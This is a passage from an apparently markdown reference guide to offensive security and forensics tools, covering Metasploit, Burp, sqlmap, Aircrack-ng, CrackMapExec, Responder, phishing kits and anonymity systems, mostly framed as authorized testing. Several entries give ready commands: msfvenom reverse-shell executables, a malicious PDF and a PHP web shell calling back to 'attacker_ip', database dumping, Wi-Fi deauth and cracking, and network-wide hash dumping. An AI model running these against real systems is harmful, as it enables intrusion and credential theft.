**When:** Exploiting known vulnerabilities with public Metasploit modules, managing multiple compromise sessions, post-exploitation operations via Meterpreter.

---

### 🔍 Exploit-DB / SearchSploit
**Type:** Website + command-line tool
**Website:** [https://www.exploit-db.com](https://www.exploit-db.com)
**SearchSploit:** included in Kali Linux

The largest public archive of exploits and vulnerable software. SearchSploit is the command-line offline interface.

```bash
searchsploit apache 2.4.41
searchsploit CVE-2021-44228
searchsploit -m 47837     # Copy exploit to current directory
```

**When:** Checking if a discovered software version has public exploit code. Finding exploits for use in authorized testing.

---

### 🔍 Nuclei
**Type:** Command-line tool (Go)
**GitHub:** [https://github.com/projectdiscovery/nuclei](https://github.com/projectdiscovery/nuclei)

Fast, template-based vulnerability scanner. Thousands of community-maintained templates for CVEs, exposures, misconfigurations, default credentials, and more. Templates appear within hours of new CVE disclosure.

```bash
nuclei -u https://target.com -tags cve -severity critical
nuclei -l targets.txt -id CVE-2021-44228
nuclei -u https://target.com -tags default-login
```

**When:** Rapid vulnerability scanning of web applications and APIs, checking for specific CVEs, finding exposed sensitive files and admin panels.

---

### 🔍 msfvenom
**Type:** Command-line tool — included with Metasploit
**Link:** Part of Metasploit Framework

Payload generator. Creates standalone executables, scripts, shellcode, and file-format exploits for all Metasploit payload types. Used to create payloads for delivery through social engineering.

```bash
# Windows reverse shell executable
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o payload.exe

# Malicious PDF
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f pdf -o malicious.pdf

# PHP web shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=attacker_ip LPORT=4444 -f raw > shell.php
```

**When:** Creating payloads for delivery via social engineering, USB drops, or web application file upload vulnerabilities.

---

## §6 — WEB APPLICATION TESTING

*The target has a web application. You need to test it for vulnerabilities.*

---

### 🔍 Burp Suite
**Type:** Desktop application (Java)
**Link:** [https://portswigger.net/burp](https://portswigger.net/burp)

The industry standard web application security testing platform. Functions as an intercepting proxy between your browser and the target — every HTTP request can be captured, modified, and replayed. Professional edition includes an active scanner; Community edition is free with manual testing capabilities.

Core tools: Proxy (intercept/modify requests), Repeater (replay and modify single requests), Intruder (automated parameter fuzzing), Scanner (automated vulnerability discovery), Decoder (encoding/decoding), Comparer (diff two responses).

**When:** Any web application security testing. Setting up Burp as your browser proxy is the first step in every web application assessment.

---

### 🔍 OWASP ZAP (Zed Attack Proxy)
**Type:** Desktop application (Java)
**Link:** [https://www.zaproxy.org](https://www.zaproxy.org)

Free and open-source web application scanner. Like Burp Suite but completely free. Less powerful than Burp Pro for manual testing but excellent for automated scanning, CI/CD integration, and learning.

**When:** Web application security testing when Burp Pro is not available. Automated scanning and CI/CD pipeline security testing.

---

### 🔍 SQLmap
**Type:** Command-line tool — included in Kali Linux
**GitHub:** [https://github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)

Automated SQL injection detection and exploitation. Tests for and exploits SQLi vulnerabilities across all major database types (MySQL, PostgreSQL, MSSQL, Oracle, SQLite). Can extract database contents, read/write files, and execute OS commands when the database user has sufficient privileges.

```bash
# Test a URL parameter
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Use a saved Burp request
sqlmap -r burp_request.txt --dbs --tables --dump

# With cookie authentication
sqlmap -u "http://target.com/page.php?id=1" --cookie="session=abc123"
```

**When:** You identified a potential SQL injection point in a web application and want to confirm and exploit it automatically.

---

### 🔍 Gobuster / ffuf / dirb
**Type:** Command-line tools — included in Kali Linux
**Gobuster:** [https://github.com/OJ/gobuster](https://github.com/OJ/gobuster)
**ffuf:** [https://github.com/ffuf/ffuf](https://github.com/ffuf/ffuf)

Web content discovery — directory and file brute forcing. Find hidden admin panels, backup files, configuration files, and unlinked pages.

```bash
# Directory brute force
gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt

# Fast fuzzing with ffuf
ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

**When:** Finding hidden paths on a web server that are not linked from the main navigation.

---

### 🔍 WPScan
**Type:** Command-line tool — included in Kali Linux
**Link:** [https://wpscan.com](https://wpscan.com)
**GitHub:** [https://github.com/wpscanteam/wpscan](https://github.com/wpscanteam/wpscan)

WordPress-specific security scanner. Detects WordPress version, installed plugins and themes, user enumeration, vulnerable plugins, and known exploits for the detected configuration.

**When:** The target runs WordPress. WPScan is always the first tool to use.

---

### 🔍 XSStrike
**Type:** Command-line tool (Python)
**GitHub:** [https://github.com/s0md3v/XSStrike](https://github.com/s0md3v/XSStrike)

Advanced XSS (Cross-Site Scripting) detection and exploitation tool. More accurate than automated scanners — generates context-aware payloads rather than using a dumb wordlist.

**When:** You suspect XSS vulnerability in a web application and want thorough detection and proof-of-concept payload generation.

---

### 🔍 Commix
**Type:** Command-line tool (Python)
**GitHub:** [https://github.com/commixproject/commix](https://github.com/commixproject/commix)

Automated OS command injection detection and exploitation. Tests for command injection in web application parameters and demonstrates code execution when found.

**When:** You suspect OS command injection in a web parameter and want automated detection and exploitation.

---

## §7 — WIRELESS ATTACKS

*You need to test Wi-Fi security or intercept wireless traffic.*

---

### 🔍 Aircrack-ng Suite
**Type:** Command-line tools — included in Kali Linux
**Link:** [https://www.aircrack-ng.org](https://www.aircrack-ng.org)

The complete wireless security toolkit: airodump-ng (capture packets), airmon-ng (enable monitor mode), aireplay-ng (inject packets/deauth), aircrack-ng (crack WEP/WPA keys).

```bash
# Put interface in monitor mode
airmon-ng start wlan0

# Capture traffic
airodump-ng wlan0mon

# Capture WPA handshake from specific network
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth to force handshake re-capture
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack captured handshake
aircrack-ng -w rockyou.txt capture-01.cap
```

**When:** WPA/WPA2 password cracking in authorized wireless assessments.

---

### 🔍 Hashcat (for WPA)
**Type:** GPU-accelerated hash cracker (already listed)

After capturing a WPA handshake with aircrack-ng, convert it to hashcat format for GPU-accelerated cracking:

```bash
# Convert capture to hashcat format
hcxpcapngtool -o hash.hc22000 capture-01.cap

# Crack with GPU
hashcat -m 22000 hash.hc22000 rockyou.txt
```

**When:** Cracking WPA handshakes with GPU acceleration for dramatically faster results than CPU-based aircrack-ng.

---

### 🔍 Wifiphisher
**Type:** Command-line tool (Python)
**GitHub:** [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher)

Automated Wi-Fi phishing attacks. Creates rogue access points that impersonate legitimate networks and serves phishing pages to connected clients to capture WPA credentials or deliver browser exploits.

**When:** Authorized wireless social engineering — testing whether employees will connect to rogue access points and submit credentials.

---

### 🔍 Bettercap
**Type:** Command-line tool (Go)
**Link:** [https://www.bettercap.org](https://www.bettercap.org)

Modern MitM framework for network attacks. ARP poisoning, DNS spoofing, SSL stripping, packet sniffing, credential capture, rogue Wi-Fi access points, Bluetooth attacks. The most capable modern MitM platform.

**When:** Man-in-the-middle attacks on LAN, wireless credential capture, ARP poisoning for traffic interception.

---

## §8 — POST-EXPLOITATION & LATERAL MOVEMENT

*You have a foothold. Now you need to move deeper.*

---

### 🔍 Meterpreter (Metasploit)
**Type:** Metasploit payload — part of Metasploit Framework

Advanced in-memory payload that provides an interactive shell with built-in commands for privilege escalation, credential dumping, file operations, network tunneling, and module execution. Lives entirely in memory — no files written to disk.

**When:** You exploited a system and now need to conduct post-exploitation operations — escalate privileges, dump credentials, pivot to other systems.

---

### 🔍 CrackMapExec (CME)
**Type:** Command-line tool (Python)
**GitHub:** [https://github.com/Porchetta-Industries/CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec)

"The Swiss Army knife for pentesting networks." Specifically designed for Active Directory environments. Tests credentials across ranges of hosts, executes commands, dumps credentials, enumerates shares, and executes Mimikatz — all remotely using SMB, WMI, and other protocols.

```bash
# Test credentials across network range
crackmapexec smb 192.168.1.0/24 -u admin -p password

# Dump SAM hashes from all accessible machines
crackmapexec smb 192.168.1.0/24 -u admin -p password --sam

# Execute command on all machines
crackmapexec smb 192.168.1.0/24 -u admin -p password -x "whoami"
```

**When:** Active Directory lateral movement, credential validation across multiple hosts, bulk post-exploitation in Windows environments.

---

### 🔍 BloodHound
**Type:** Desktop application + SharpHound collector
**GitHub:** [https://github.com/BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound)

Maps Active Directory environments and identifies attack paths to Domain Admin using graph theory. SharpHound collects AD data; BloodHound visualizes relationships and finds shortest paths to high-value targets.

```bash
# Collect AD data (run on Windows in target domain)
./SharpHound.exe -c All

# Import to BloodHound and query:
# "Find all Domain Admins"
# "Find Shortest Paths to Domain Admins"
# "Find Principals with DCSync Rights"
```

**When:** You have domain credentials and need to understand the Active Directory attack path to Domain Admin.

---

### 🔍 PowerSploit / PowerView
**Type:** PowerShell modules
**GitHub:** [https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

Collection of PowerShell modules for post-exploitation. PowerView specifically enables AD enumeration from within PowerShell without additional tooling. Invoke-Mimikatz, Invoke-ReflectivePEInjection, and many other powerful modules.

**When:** Post-exploitation in Windows environments where you need to operate through PowerShell rather than uploading executables.

---

### 🔍 Chisel
**Type:** Command-line tool (Go)
**GitHub:** [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)

Fast TCP/UDP tunnel over HTTP with SSH encryption. Used for port forwarding and network pivoting — routing traffic through a compromised host to reach otherwise inaccessible network segments.

**When:** You have compromised a host and need to pivot through it to reach internal network segments that are not directly accessible.

---

### 🔍 Ligolo-ng
**Type:** Command-line tool (Go)
**GitHub:** [https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Advanced tunneling tool that creates a tun interface for seamless network pivoting. Allows routing traffic to internal networks through a compromised agent as if directly connected.

**When:** Network pivoting during internal penetration tests. More sophisticated than Chisel for complex multi-segment networks.

---

## §9 — TRAFFIC ANALYSIS & NETWORK FORENSICS

*You need to capture or analyze network traffic.*

---

### 🔍 Wireshark
**Type:** Desktop application (Windows/Linux/macOS)
**Link:** [https://www.wireshark.org](https://www.wireshark.org)

The world's most used network protocol analyzer. Captures and dissects every protocol in real time. Essential for credential capture (HTTP, FTP, Telnet), malware traffic analysis, protocol debugging, and network forensics.

**When:** Capturing traffic on a network segment where you have physical or logical access, analyzing captured PCAP files, investigating malware communications.

---

### 🔍 tcpdump
**Type:** Command-line tool — available on all Linux systems

Command-line packet capture. No GUI — essential for remote/headless systems. Capture to PCAP, filter with BPF syntax, analyze basic traffic at the terminal.

```bash
sudo tcpdump -i eth0 -w capture.pcap
sudo tcpdump -i eth0 -A port 80          # Print HTTP in ASCII
sudo tcpdump -i eth0 'not port 22'       # Exclude SSH
```

**When:** Capturing traffic on a remote server via SSH where Wireshark is not available.

---

### 🔍 Responder
**Type:** Command-line tool (Python) — included in Kali Linux
**GitHub:** [https://github.com/lgandx/Responder](https://github.com/lgandx/Responder)

Poisons LLMNR, NBT-NS, and mDNS queries on a local Windows network, causing Windows machines to send NTLMv1/v2 authentication hashes to the attacker. Captures these hashes for offline cracking with Hashcat.

```bash
sudo responder -I eth0 -wrf
```

**When:** On an internal Windows network, run Responder to passively capture NTLMv2 hashes from machines that attempt to authenticate to you after LLMNR/NBT-NS poisoning.

---

## §10 — ANONYMITY & OPSEC

*You need to conduct operations without revealing your identity or IP address.*

---

### 🔍 Whonix
**Type:** Operating system (Virtual machine — two VMs: Gateway + Workstation)
**Link:** [https://www.whonix.org](https://www.whonix.org)

A security-hardened Linux OS designed for anonymity. Consists of two VMs: the Gateway routes all traffic through Tor; the Workstation is where you work — all its traffic passes through the Gateway with no direct internet connectivity possible. Even if the Workstation is compromised by malware, the attacker cannot discover your real IP because the Workstation literally cannot make direct internet connections.

**When:** Operations requiring strong anonymity. The Workstation VM cannot reveal your real IP even if compromised, making this more robust than simply running Tor Browser on a standard OS.

---

### 🔍 Tails OS
**Type:** Operating system (Live USB — amnesic)
**Link:** [https://tails.boum.org](https://tails.boum.org)

Amnesic live operating system that boots from a USB drive and leaves no trace on the computer it runs on. Routes all internet traffic through Tor. When you shut down, RAM is wiped — nothing persists. Every session starts from a clean state.

**When:** Operations where you need to leave absolutely no traces on the physical machine. Plug in, work, unplug — the host computer has no record of what occurred.

---

### 🔍 Kali Linux
**Type:** Operating system (ISO / VM / USB)
**Link:** [https://www.kali.org](https://www.kali.org)

The standard penetration testing operating system. Pre-installed with 600+ security tools. Maintained by Offensive Security (creators of OSCP). Available as a full install, VM image, live USB, or WSL2 on Windows.

**When:** Your primary working environment for all penetration testing, OSINT, and security research work.

---

### 🔍 Parrot OS
**Type:** Operating system
**Link:** [https://www.parrotsec.org](https://www.parrotsec.org)

Security-focused Linux distribution similar to Kali but lighter, designed for daily use, with both security tools and privacy features. Better resource usage than Kali on older hardware.

**When:** Alternative to Kali, particularly on older hardware or when you want a lighter daily-driver security OS.

---

### 🔍 Tor Browser
**Type:** Desktop application (Windows/Linux/macOS)
**Link:** [https://www.torproject.org](https://www.torproject.org)

Routes internet traffic through the Tor anonymity network — three volunteer-operated relays — before reaching the destination. The destination sees only the exit node's IP, not your real IP.

**When:** Anonymous web browsing, accessing .onion sites (dark web), and performing OSINT without revealing your real IP address.

---

### 🔍 ProxyChains
**Type:** Command-line tool — included in Kali Linux

Forces any TCP connection from any Linux application through a configured chain of SOCKS4/5 or HTTP proxies. Works with any tool — nmap, curl, metasploit — without the tool needing native proxy support.

```bash
# Configure /etc/proxychains4.conf with proxy chain
# Then run any tool through it:
proxychains nmap -sT target
proxychains msfconsole
proxychains curl http://target
```

**When:** Routing tool traffic through proxy chains for IP obfuscation during authorized testing. Combined with VPNs and Tor for multi-hop anonymization.

---

### 🔍 Mullvad VPN
**Type:** Commercial VPN service
**Link:** [https://mullvad.net](https://mullvad.net)

Privacy-focused VPN with a strict no-logs policy, independently audited. Accepts cash and cryptocurrency payments — no account required, just an account number. Based in Sweden under strong privacy laws.

**When:** IP obfuscation for authorized testing and private internet access. Preferred by security researchers for its no-logs stance and anonymous payment options.

---

### 🔍 Anonsurf (Parrot OS)
**Type:** Command-line tool — included in Parrot OS
**GitHub:** [https://github.com/Und3rf10w/kali-anonsurf](https://github.com/Und3rf10w/kali-anonsurf)

Routes all system traffic through Tor with a single command. DNS queries also go through Tor to prevent DNS leaks.

```bash
anonsurf start    # Route all traffic through Tor
anonsurf myip     # Verify external IP is a Tor exit node
anonsurf stop     # Return to normal routing
```

**When:** Quick system-wide anonymization through Tor on Kali or Parrot systems.

---

### 🔍 Qubes OS
**Type:** Operating system
**Link:** [https://www.qubes-os.org](https://www.qubes-os.org)

Security through compartmentalization. Each application, task, or network runs in its own isolated VM (called a "qube"). If one qube is compromised, the attacker cannot reach others. Can integrate Whonix for anonymous qubes.

**When:** The highest-security operational environment where you need both strong anonymity (Whonix integration) and compartmentalization between different tasks or identities.

---

## §11 — THREAT INTELLIGENCE

*You need context on threat actors, known attacks, and vulnerability intelligence.*

---

### 🔍 MITRE ATT&CK
**Type:** Framework / Knowledge Base (Website)
**Link:** [https://attack.mitre.org](https://attack.mitre.org)

Not a tool — a knowledge base. A systematically organized catalog of adversary tactics, techniques, and procedures (TTPs) observed in real-world intrusions. 14 tactics from Initial Access through Impact, each with specific techniques and sub-techniques. Every technique includes real-world usage examples, detection methods, and mitigation guidance.

**When:** Understanding what attackers do at each phase of an intrusion. Mapping your penetration test methodology to real attacker behavior. Understanding how defenders should detect what you are doing.

---

### 🔍 MITRE D3FEND
**Type:** Framework / Knowledge Base (Website)
**Link:** [https://d3fend.mitre.org](https://d3fend.mitre.org)

The defensive counterpart to ATT&CK. Maps defensive countermeasures to ATT&CK techniques. For every attack technique, D3FEND shows which defensive controls detect or prevent it.

**When:** Understanding the defensive landscape for each attack technique you are using or recommending against.

---

### 🔍 CISA KEV (Known Exploited Vulnerabilities)
**Type:** Website + JSON feed
**Link:** [https://www.cisa.gov/known-exploited-vulnerabilities-catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)

The U.S. government's catalog of CVEs confirmed as actively exploited in the wild. The most authoritative real-world exploitation signal available — if a CVE is here, real attackers are using it right now.

**When:** Prioritizing which vulnerabilities to address immediately. Finding which discovered vulnerabilities have confirmed active exploitation.

---

### 🔍 NVD (National Vulnerability Database)
**Type:** Website + API
**Link:** [https://nvd.nist.gov](https://nvd.nist.gov)

NIST's authoritative enrichment of CVE records with CVSS scores, CWE classifications, affected product ranges (CPE), and reference links. The primary reference for vulnerability severity and technical details.

**When:** Looking up the full details, CVSS score, and affected version ranges for any CVE.

---

### 🔍 EPSS (Exploit Prediction Scoring System)
**Type:** API + Data Feed
**Link:** [https://www.first.org/epss](https://www.first.org/epss)

Machine learning-based scoring system that predicts the probability a CVE will be exploited in the next 30 days. Complements CVSS by providing exploitation likelihood rather than just theoretical severity.

**When:** Prioritizing vulnerability remediation — a high-EPSS CVE may need faster patching than a higher-CVSS but low-EPSS one.

---

### 🔍 VirusTotal
**Type:** Website + API
**Link:** [https://www.virustotal.com](https://www.virustotal.com)

Analyzes files, URLs, domains, and IP addresses against 70+ antivirus engines and URL reputation databases. Also shows behavioral analysis from sandbox execution, community comments, and threat intelligence.

**When:** Checking if a file is malicious, verifying domain reputation, checking if an IP is associated with malware C2, checking if your own payload will be detected by AV.

---

### 🔍 Threat Intelligence Feeds — AlienVault OTX
**Type:** Website + API
**Link:** [https://otx.alienvault.com](https://otx.alienvault.com)

Open threat intelligence community. Millions of indicators of compromise (IOCs) — IP addresses, domains, file hashes — contributed by security researchers worldwide. "Pulses" group IOCs by campaign or threat actor.

**When:** Checking if a target IP or domain is associated with known malicious activity. Looking up IOCs during incident response.

---

### 🔍 Shodan CVE Search
**Type:** Shodan feature
**Link:** [https://www.shodan.io/search?query=vuln:CVE-2021-44228](https://www.shodan.io/search?query=vuln:CVE-2021-44228)

Search Shodan for internet-facing systems vulnerable to specific CVEs. Shows exactly how many systems globally and in specific organizations are running vulnerable software.

**When:** Understanding the scale of vulnerability exposure globally, finding vulnerable systems in a target organization's IP range, demonstrating business impact.

---

## §12 — SOCIAL ENGINEERING TOOLS

*You need tools for phishing, vishing, and physical attacks.*

---

### 🔍 Social-Engineer Toolkit (SET)
**Type:** Command-line framework (Python) — included in Kali Linux
**GitHub:** [https://github.com/trustedsec/social-engineer-toolkit](https://github.com/trustedsec/social-engineer-toolkit)

The most comprehensive social engineering framework. Phishing campaigns, credential harvesting, website cloning, malicious payload generation, HID attacks, USB attacks, and Metasploit integration.

**When:** Any authorized social engineering engagement — creating phishing pages, generating malicious attachments, website cloning.

---

### 🔍 GoPhish
**Type:** Web application (Go)
**GitHub:** [https://github.com/gophish/gophish](https://github.com/gophish/gophish)

Professional phishing campaign management platform. Email delivery, tracking (open/click/credential submission), campaign analytics, and per-user reporting.

**When:** Running organized, trackable phishing campaigns against target employee lists in authorized social engineering assessments.

---

### 🔍 Evilginx2
**Type:** Command-line tool (Go)
**GitHub:** [https://github.com/kgretzky/evilginx2](https://github.com/kgretzky/evilginx2)

Adversary-in-the-middle phishing framework that bypasses MFA by capturing session tokens rather than credentials. The target authenticates normally — including completing MFA — and Evilginx captures the resulting authenticated session cookie.

**When:** Phishing assessments where targets use MFA (Microsoft 365, Google Workspace). Demonstrates that MFA does not stop AitM phishing.

---

### 🔍 BeEF (Browser Exploitation Framework)
**Type:** Web application (Ruby) — included in Kali Linux
**Link:** [https://beefproject.com](https://beefproject.com)
**GitHub:** [https://github.com/beefproject/beef](https://github.com/beefproject/beef)

Hooks target browsers via JavaScript and provides real-time browser command-and-control. Credential theft via fake dialogs, screenshot capture, keylogging, Metasploit browser exploit delivery.

**When:** Demonstrating the impact of XSS vulnerabilities beyond alert boxes. Browser-based social engineering.

---

### 🔍 Twilio
**Type:** Commercial API service
**Link:** [https://www.twilio.com](https://www.twilio.com)

Programmable voice and SMS with full caller ID control. The professional standard for vishing campaign infrastructure in authorized engagements.

**When:** Building vishing (voice phishing) infrastructure with custom caller ID for authorized social engineering assessments.

---

## §13 — FORENSICS & INCIDENT RESPONSE (DFIR)

*You need to investigate a system, analyze malware, or recover evidence.*

---

### 🔍 Autopsy
**Type:** Desktop application (Windows/Linux/macOS)
**Link:** [https://www.autopsy.com](https://www.autopsy.com)

Open-source digital forensics platform. Disk image analysis, file recovery, timeline analysis, registry analysis, keyword search, hash verification, and artifact extraction.

**When:** Investigating a compromised system or storage device. Recovering deleted files. Building a forensic timeline of events.

---

### 🔍 Volatility
**Type:** Command-line tool (Python)
**GitHub:** [https://github.com/volatilityfoundation/volatility3](https://github.com/volatilityfoundation/volatility3)

Memory forensics framework. Analyzes RAM dumps for running processes, network connections, injected code, malware artifacts, credentials in memory, and registry hives.

```bash
# List running processes from memory dump
vol.py -f memory.raw windows.pslist

# Find network connections
vol.py -f memory.raw windows.netstat

# Dump process memory for analysis
vol.py -f memory.raw windows.dumpfiles --pid 1234
```

**When:** Analyzing memory dumps from potentially compromised systems. Finding malware that exists only in memory. Extracting credentials from memory during authorized post-exploitation.

---

### 🔍 Ghidra
**Type:** Desktop application (Java)
**Link:** [https://ghidra-sre.org](https://ghidra-sre.org)

NSA's open-source reverse engineering framework. Disassembles, decompiles, and analyzes binary executables. Supports Windows PE, Linux ELF, macOS Mach-O, and many other formats.

**When:** Analyzing malware samples, understanding how a binary works, finding vulnerabilities in closed-source software.

---

### 🔍 IDA Pro / IDA Free
**Type:** Desktop application
**Link:** [https://www.hex-rays.com](https://www.hex-rays.com)

The industry standard disassembler and debugger. IDA Free is limited; IDA Pro is the commercial version used by professional malware analysts and vulnerability researchers.

**When:** Professional malware analysis and binary reverse engineering.

---

### 🔍 Velociraptor
**Type:** Application (server + agent)
**GitHub:** [https://github.com/Velocidex/velociraptor](https://github.com/Velocidex/velociraptor)

Endpoint visibility and collection platform for incident response. Hunt for artifacts, collect forensic data, detect threats, and monitor for IOCs across entire networks simultaneously.

**When:** Enterprise incident response — hunting for compromise indicators across hundreds of systems simultaneously.

---

## §14 — PRACTICE PLATFORMS

*You need to legally practice hacking skills.*

---

### 🔍 Hack The Box (HTB)
**Type:** Website (online platform)
**Link:** [https://www.hackthebox.com](https://www.hackthebox.com)

The most respected online penetration testing practice platform. Contains vulnerable machines (boxes) and networks at varying difficulty levels. Completing machines builds genuine skills — the challenges are realistic and require actual understanding, not just tool execution.

**When:** Skill development for penetration testing. OSCP preparation. Learning specific techniques in a legal, controlled environment.

---

### 🔍 TryHackMe
**Type:** Website (online platform)
**Link:** [https://tryhackme.com](https://tryhackme.com)

More beginner-friendly than HTB. Guided learning paths for specific topics — web app testing, Active Directory, OSINT, reverse engineering. Works entirely in the browser with no local setup required.

**When:** Learning specific topics from scratch. More structured approach than HTB for beginners.

---

### 🔍 VulnHub
**Type:** Website (downloadable VMs)
**Link:** [https://www.vulnhub.com](https://www.vulnhub.com)

Free downloadable vulnerable virtual machines for local practice. No internet connection required — run completely in your local lab.

**When:** Offline practice when internet access is unavailable or when you want a completely isolated lab environment.

---

### 🔍 Hacker.org
**Type:** Website (CTF challenges)
**Link:** [https://hacker.org](https://hacker.org)

CTF-style challenges covering programming, cryptography, web security, and network analysis. Builds the analytical thinking needed for real security work.

**When:** Developing analytical and technical problem-solving skills that transfer to real penetration testing work.

---

### 🔍 PortSwigger Web Security Academy
**Type:** Website (free learning platform)
**Link:** [https://portswigger.net/web-security](https://portswigger.net/web-security)

Free, comprehensive web application security learning from the creators of Burp Suite. Covers every OWASP vulnerability with interactive labs. Arguably the best free resource for learning web application security.

**When:** Learning web application security testing from the ground up, or deepening knowledge of specific vulnerability classes.

---

### 🔍 PentesterLab
**Type:** Website + exercises
**Link:** [https://pentesterlab.com](https://pentesterlab.com)

Practical web application security exercises ranging from beginner to advanced. Some free, some paid. Particularly good for web vulnerabilities and code review.

**When:** Structured web application security skill building with certificates of completion.

---

## §15 — VULNERABILITY DATABASES

*You need to research a vulnerability, find exploit code, or understand CVEs.*

---

### 🔍 Exploit-DB
**Type:** Website
**Link:** [https://www.exploit-db.com](https://www.exploit-db.com)

The largest public archive of exploits and vulnerable software. Maintained by Offensive Security.

---

### 🔍 NVD / NIST
**Type:** Website + API
**Link:** [https://nvd.nist.gov](https://nvd.nist.gov)

CVSS scores, CWE classification, affected product ranges for every CVE.

---

### 🔍 Vulners
**Type:** Website + API
**Link:** [https://vulners.com](https://vulners.com)

Unified security vulnerability search across multiple databases — NVD, exploit-db, vendor advisories, and more. Often more current than NVD for recent CVEs.

---

### 🔍 CVE Mitre
**Type:** Website
**Link:** [https://cve.mitre.org](https://cve.mitre.org)

The authoritative source of record for CVE identifiers.

---

### 🔍 PacketStorm Security
**Type:** Website
**Link:** [https://packetstormsecurity.com](https://packetstormsecurity.com)

Security tools, exploits, and advisories archive. Contains exploits not in Exploit-DB and has been continuously updated since 1998.

---

### 🔍 0day.today
**Type:** Website
**Link:** [https://0day.today](https://0day.today)

Database of exploits including some that are not publicly available on Exploit-DB. Some content is commercial.

---

## §16 — DOCUMENTATION & REPORTING

*You need to document findings and produce professional reports.*

---

### 🔍 Obsidian
**Type:** Desktop application (Windows/Linux/macOS)
**Link:** [https://obsidian.md](https://obsidian.md)

Markdown-based note-taking with linking. Essential for real-time engagement documentation — take notes, attach screenshots, link findings, build the report structure as you work.

**When:** Real-time engagement note-taking. Building your personal knowledge base of techniques and findings.

---

### 🔍 Dradis
**Type:** Web application
**Link:** [https://dradisframework.com](https://dradisframework.com)

Collaboration and reporting platform for penetration testing teams. Aggregates findings from Nmap, Burp Suite, Nessus, Metasploit, and other tools into a unified report.

**When:** Team penetration test where multiple testers need to collaborate on findings and produce a unified report.

---

### 🔍 Faraday
**Type:** Web application
**Link:** [https://faradaysec.com](https://faradaysec.com)

Collaborative penetration testing IDE. Aggregates tool output, manages vulnerabilities, and generates reports.

**When:** Enterprise-scale assessments requiring team coordination and systematic vulnerability tracking.

---

### 🔍 PlexTrac
**Type:** Commercial web application
**Link:** [https://plextrac.com](https://plextrac.com)

Cloud-based penetration testing reporting and client collaboration platform. Professional output for consulting firm deliverables.

**When:** Client-facing pentest report delivery in a consulting context.

---

## §17 — CLOUD SECURITY

*The target uses AWS, Azure, or GCP. You need cloud-specific tools.*

---

### 🔍 ScoutSuite
**Type:** Command-line tool (Python)
**GitHub:** [https://github.com/nccgroup/ScoutSuite](https://github.com/nccgroup/ScoutSuite)

Multi-cloud security auditing tool. Assesses the security posture of AWS, Azure, and GCP environments. Checks for overly permissive IAM policies, exposed storage, unencrypted data, insecure security group rules, and hundreds of other cloud security issues.

**When:** Cloud infrastructure security assessment — checking for misconfigurations across an organization's cloud environment.

---

### 🔍 Pacu
**Type:** Command-line framework (Python)
**GitHub:** [https://github.com/RhinoSecurityLabs/pacu](https://github.com/RhinoSecurityLabs/pacu)

AWS exploitation framework. The Metasploit for AWS — modular, with modules for privilege escalation, credential enumeration, data exfiltration, persistence, and reconnaissance within AWS environments.

**When:** AWS penetration testing after obtaining initial AWS credentials. Privilege escalation, lateral movement within AWS.

---

### 🔍 S3Scanner
**Type:** Command-line tool (Python)
**GitHub:** [https://github.com/sa7mon/S3Scanner](https://github.com/sa7mon/S3Scanner)

Finds open S3 buckets associated with a target. Tests for public read/write access.

**When:** Checking if a target organization has publicly accessible S3 buckets containing sensitive data.

---

### 🔍 CloudMapper
**Type:** Command-line tool (Python)
**GitHub:** [https://github.com/duo-labs/cloudmapper](https://github.com/duo-labs/cloudmapper)

Visualizes AWS environment relationships and identifies security issues. Creates network diagrams of VPC configuration.

**When:** Understanding the architecture of an AWS environment and identifying network exposure.

---

## §18 — REVERSE ENGINEERING

*You have a binary, malware sample, or unknown file you need to analyze.*

---

### 🔍 Ghidra
**Type:** Desktop application — already listed in Forensics
**Link:** [https://ghidra-sre.org](https://ghidra-sre.org)

---

### 🔍 radare2
**Type:** Command-line framework
**Link:** [https://rada.re](https://rada.re)
**GitHub:** [https://github.com/radareorg/radare2](https://github.com/radareorg/radare2)

Portable reverse engineering framework — disassembler, debugger, binary analysis. Text-based but extraordinarily powerful. Steep learning curve but used by advanced researchers.

**When:** Deep binary analysis, debugging, and exploit development.

---

### 🔍 x64dbg
**Type:** Windows application (debugger)
**Link:** [https://x64dbg.com](https://x64dbg.com)

Dynamic debugger for Windows. Open-source, actively maintained. The standard tool for dynamically debugging Windows binaries and malware samples.

**When:** Dynamic analysis of Windows executables — stepping through execution, setting breakpoints, analyzing behavior in real time.

---

### 🔍 ANY.RUN
**Type:** Website (cloud sandbox)
**Link:** [https://any.run](https://any.run)

Interactive online malware sandbox. Upload a suspicious file or URL, watch its execution in a Windows environment in real time, see network connections, file system changes, process activity, and IOCs.

**When:** Quick malware analysis without a local sandbox. Immediate behavioral intelligence from a file or URL.

---

### 🔍 Hybrid Analysis
**Type:** Website (cloud sandbox)
**Link:** [https://hybrid-analysis.com](https://hybrid-analysis.com)

Free malware analysis service powered by Falcon Sandbox. Analyzes PE files, Office documents, PDFs, URLs, and more. Returns detailed behavioral reports and IOCs.

**When:** Free automated malware analysis and IOC extraction.

---

## §19 — MOBILE SECURITY

*The target has a mobile application. You need to test it.*

---

### 🔍 MobSF (Mobile Security Framework)
**Type:** Web application (Docker)
**GitHub:** [https://github.com/MobSF/Mobile-Security-Framework-MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF)

Automated mobile application security testing — static analysis (APK/IPA/source code), dynamic analysis (requires Android emulator), and malware analysis.

**When:** Mobile application security assessment. Automated first-pass analysis of Android APK or iOS IPA files.

---

### 🔍 Frida
**Type:** Dynamic instrumentation toolkit
**Link:** [https://frida.re](https://frida.re)

